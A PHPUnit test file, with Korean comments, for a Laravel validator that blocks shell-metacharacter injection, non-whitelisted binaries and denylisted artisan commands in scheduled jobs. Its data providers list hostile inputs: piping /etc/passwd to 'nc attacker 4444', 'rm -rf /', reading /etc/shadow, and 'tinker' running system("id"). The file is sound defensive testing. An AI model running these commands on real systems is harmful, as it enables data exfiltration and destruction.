<?php

namespace Tests\Unit\Support;

use App\Support\ScheduleCommandValidator;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use Tests\TestCase;

/**
 * 스케줄 Shell/Artisan command 검증 유틸 테스트.
 *
 * 스케줄 생성 권한만 위임받은 계정이 임의 OS 명령·임의 PHP 코드를 실행하는 경로를
 * 전수 매트릭스로 차단 검증한다 (셸 메타문자 주입, 화이트리스트 우회, 차단목록 우회).
 */
class ScheduleCommandValidatorTest extends TestCase
{
    /**
     * shell 게이트를 켜고 허용 실행 파일을 등록합니다.
     *
     * @param  array<int, string>  $binaries  허용 실행 파일 basename 목록
     */
    private function enableShell(array $binaries = ['backup.sh']): void
    {
        config([
            'schedule_security.shell.enabled' => true,
            'schedule_security.shell.allowed_binaries' => $binaries,
        ]);
    }

    // ========================================================================
    // Shell — 게이트
    // ========================================================================

    /**
     * 게이트가 꺼져 있으면 화이트리스트에 있는 명령도 거부한다 (기본 차단).
     */
    #[Test]
    public function it_blocks_every_shell_command_when_the_gate_is_disabled(): void
    {
        config([
            'schedule_security.shell.enabled' => false,
            'schedule_security.shell.allowed_binaries' => ['backup.sh'],
        ]);

        $this->assertFalse(ScheduleCommandValidator::isShellCommandAllowed('backup.sh'));
    }

    /**
     * 게이트가 켜져 있어도 화이트리스트가 비어 있으면 모두 거부한다.
     */
    #[Test]
    public function it_blocks_every_shell_command_when_the_whitelist_is_empty(): void
    {
        $this->enableShell([]);

        $this->assertFalse(ScheduleCommandValidator::isShellCommandAllowed('backup.sh'));
    }

    // ========================================================================
    // Shell — 화이트리스트
    // ========================================================================

    /**
     * 게이트 on + 화이트리스트 등록 실행 파일은 허용한다 (정상 운영 경로).
     *
     * @param  string  $command  허용되어야 하는 command
     */
    #[Test]
    #[DataProvider('allowedShellCommandProvider')]
    public function it_allows_whitelisted_shell_binaries(string $command): void
    {
        $this->enableShell(['backup.sh']);

        $this->assertTrue(
            ScheduleCommandValidator::isShellCommandAllowed($command),
            "허용되어야 하는 명령이 차단됨: {$command}"
        );
    }

    /**
     * 화이트리스트에 없는 실행 파일은 거부한다.
     *
     * @param  string  $command  차단되어야 하는 command
     * @param  string  $reason  차단 사유 (실패 메시지용)
     */
    #[Test]
    #[DataProvider('blockedShellCommandProvider')]
    public function it_blocks_shell_commands_outside_the_whitelist(string $command, string $reason): void
    {
        $this->enableShell(['backup.sh']);

        $this->assertFalse(
            ScheduleCommandValidator::isShellCommandAllowed($command),
            "차단되어야 하는 명령이 통과함 ({$reason}): {$command}"
        );
    }

    // ========================================================================
    // Shell — 토큰화 (셸 미경유 실행 가능 여부)
    // ========================================================================

    /**
     * 셸 메타문자가 섞인 명령은 토큰화를 거부한다 (인자배열 실행 불가 → 실행 차단).
     *
     * @param  string  $command  메타문자가 포함된 command
     * @param  string  $reason  차단 사유 (실패 메시지용)
     */
    #[Test]
    #[DataProvider('shellMetacharacterCommandProvider')]
    public function it_refuses_to_tokenize_commands_containing_shell_metacharacters(string $command, string $reason): void
    {
        $this->assertNull(
            ScheduleCommandValidator::tokenizeShellCommand($command),
            "토큰화가 거부되어야 하는 명령이 통과함 ({$reason}): {$command}"
        );
    }

    /**
     * 메타문자 없는 명령은 공백 기준 인자 배열로 토큰화한다.
     */
    #[Test]
    public function it_tokenizes_a_plain_command_into_an_argument_array(): void
    {
        $this->assertSame(
            ['backup.sh', '--full', '/var/data'],
            ScheduleCommandValidator::tokenizeShellCommand('backup.sh  --full   /var/data')
        );
    }

    /**
     * 빈 문자열·공백만 있는 명령은 토큰화를 거부한다.
     */
    #[Test]
    public function it_refuses_to_tokenize_a_blank_command(): void
    {
        $this->assertNull(ScheduleCommandValidator::tokenizeShellCommand('   '));
    }

    // ========================================================================
    // Artisan — 차단목록
    // ========================================================================

    /**
     * 차단목록에 오른 artisan 명령은 거부한다 (코드 실행형·파괴적 명령).
     *
     * @param  string  $command  차단되어야 하는 command
     */
    #[Test]
    #[DataProvider('deniedArtisanCommandProvider')]
    public function it_blocks_denylisted_artisan_commands(string $command): void
    {
        $this->assertFalse(
            ScheduleCommandValidator::isArtisanCommandAllowed($command),
            "차단되어야 하는 artisan 명령이 통과함: {$command}"
        );
    }

    /**
     * 차단목록에 없는 artisan 명령은 허용한다 (기본 허용).
     *
     * @param  string  $command  허용되어야 하는 command
     */
    #[Test]
    #[DataProvider('allowedArtisanCommandProvider')]
    public function it_allows_artisan_commands_that_are_not_denylisted(string $command): void
    {
        $this->assertTrue(
            ScheduleCommandValidator::isArtisanCommandAllowed($command),
            "허용되어야 하는 artisan 명령이 차단됨: {$command}"
        );
    }

    /**
     * artisan 명령명은 첫 토큰으로 추출한다.
     */
    #[Test]
    public function it_extracts_the_artisan_command_name_from_the_first_token(): void
    {
        $this->assertSame('cache:clear', ScheduleCommandValidator::extractArtisanCommandName('  cache:clear --force '));
        $this->assertNull(ScheduleCommandValidator::extractArtisanCommandName('   '));
    }

    // ========================================================================
    // Data Providers
    // ========================================================================

    /**
     * 허용되어야 하는 shell command 목록.
     *
     * @return array<string, array{string}>
     */
    public static function allowedShellCommandProvider(): array
    {
        return [
            '실행 파일 단독' => ['backup.sh'],
            '인자 포함' => ['backup.sh --full /var/data'],
            '절대경로 (basename 일치)' => ['/usr/local/bin/backup.sh --full'],
            '앞뒤 공백' => ['  backup.sh  '],
        ];
    }

    /**
     * 차단되어야 하는 shell command 목록.
     *
     * @return array<string, array{string, string}>
     */
    public static function blockedShellCommandProvider(): array
    {
        return [
            '화이트리스트 외 명령' => ['id', '보고서 주 시나리오 — 임의 명령 실행'],
            '화이트리스트 외 절대경로' => ['/bin/sh', '셸 자체 실행'],
            '접두사 확장 우회' => ['backup.sh.evil', 'basename 완전 일치가 아님'],
            '접미사 확장 우회' => ['evil-backup.sh', 'basename 완전 일치가 아님'],
            '체이닝으로 화이트리스트 위장' => ['backup.sh; id', '메타문자 — 토큰화 거부'],
            '파이프로 화이트리스트 위장' => ['backup.sh | nc attacker 4444', '메타문자 — 토큰화 거부'],
            '명령치환으로 화이트리스트 위장' => ['backup.sh $(id)', '메타문자 — 토큰화 거부'],
            '빈 명령' => ['', '빈 문자열'],
        ];
    }

    /**
     * 셸 해석을 유발하는 메타문자가 포함된 command 목록.
     *
     * @return array<string, array{string, string}>
     */
    public static function shellMetacharacterCommandProvider(): array
    {
        return [
            '세미콜론 체이닝' => ['backup.sh; rm -rf /', '세미콜론'],
            '파이프' => ['cat /etc/passwd | nc attacker 4444', '파이프'],
            '백그라운드 실행' => ['backup.sh & id', '앰퍼샌드'],
            '명령치환 $()' => ['echo $(id)', '달러 + 괄호'],
            '명령치환 백틱' => ['echo `id`', '백틱'],
            '출력 리다이렉션' => ['backup.sh > /etc/crontab', '리다이렉션'],
            '입력 리다이렉션' => ['backup.sh < /etc/shadow', '리다이렉션'],
            '와일드카드' => ['rm -rf /var/*', '글롭'],
            '따옴표' => ['backup.sh "a b"', '따옴표 — 순진한 토큰화 불가'],
            '개행 주입' => ["backup.sh\nid", '개행'],
        ];
    }

    /**
     * 차단되어야 하는 artisan command 목록.
     *
     * @return array<string, array{string}>
     */
    public static function deniedArtisanCommandProvider(): array
    {
        return [
            'tinker — 임의 PHP 실행' => ['tinker --execute=system("id");'],
            'tinker 단독' => ['tinker'],
            '대소문자 우회' => ['TINKER --execute=1'],
            'db:wipe — 파괴적' => ['db:wipe'],
            'migrate:fresh — 파괴적' => ['migrate:fresh --seed'],
            'migrate:reset' => ['migrate:reset'],
            'migrate:rollback' => ['migrate:rollback'],
            'key:generate' => ['key:generate'],
            'env:decrypt' => ['env:decrypt'],
            'schedule:run' => ['schedule:run'],
            '빈 명령' => [''],
        ];
    }

    /**
     * 허용되어야 하는 artisan command 목록 (정상 운영 명령).
     *
     * @return array<string, array{string}>
     */
    public static function allowedArtisanCommandProvider(): array
    {
        return [
            'cache:clear' => ['cache:clear'],
            '인자 포함' => ['queue:work --stop-when-empty'],
            'inspire' => ['inspire'],
        ];
    }
}
